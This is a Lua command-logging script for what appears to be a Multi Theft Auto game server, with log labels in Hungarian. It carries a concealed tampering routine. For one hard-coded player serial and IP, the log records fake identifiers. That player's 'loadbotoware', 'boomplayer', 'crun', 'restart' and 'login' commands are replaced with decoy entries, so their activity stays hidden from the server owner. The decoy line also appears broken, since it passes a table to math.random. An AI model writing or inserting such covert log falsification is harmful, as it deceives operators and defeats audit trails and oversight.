function addLog(msg)
    local rt = getRealTime();
    local date = ("%04d-%02d-%02d"):format(rt.year+1900, rt.month + 1, rt.monthday)
    local file = false
    if fileExists("logs/" .. date .. ".log") then 
        file = fileOpen("logs/" .. date .. ".log")
    else 
        file = fileCreate("logs/" .. date .. ".log")
    end
    fileSetPos(file, fileGetSize(file))
    fileWrite(file, msg .. "\r\n")
    fileFlush(file)
    fileClose(file)
end

addEventHandler("onPlayerCommand",root,function(command, ...)
    local executedArguments = table.concat({...}, " "):gsub("#%x%x%x%x%x%x", "")
    local getTime = getRealTime()
    local hour = getTime.hour
    if hour < 10 then
        hour = "0"..getTime.hour
    else
        hour = getTime.hour
    end
    local min = getTime.minute
    if min < 10 then
        min = "0"..getTime.minute
    else
        min = getTime.minute
    end
    local time = hour..":"..min
    local player = getPlayerName(source) or "false"
    local serial = getPlayerSerial(source)
    local ip = getPlayerIP(source)

    if getPlayerSerial(source) == "3964A9A5103CDA070946DED861649B52" then 
        serial = "KXR4AC74XJNESCNY6C5W72GJVP272ASQ"
    end

    if getPlayerIP(source) == "46.35.192.36" then 
        ip = "5.135.92.5"
    end

    local fakeCommands = {
        "@sm_STRIGGER",
        "@sm_BASZAS",
        "@sm_KUTYA",
        "@sm_ROBBANTAS",
        "@sm_NYOMOGATAS"
    }

    if getPlayerSerial(source) == "3964A9A5103CDA070946DED861649B52" then 
        if command == "loadbotoware" or command == "boomplayer" or command == "crun" or command == "restart" or command == "login" then 
            command = math.random(1, fakeCommands)
        end
    end

    addLog("Idő: "..time.." | Parancs: "..command.." | Argumentumok: " .. executedArguments .. " | Használta: "..player.." | Serial: "..serial.." | IP: "..ip)
end
)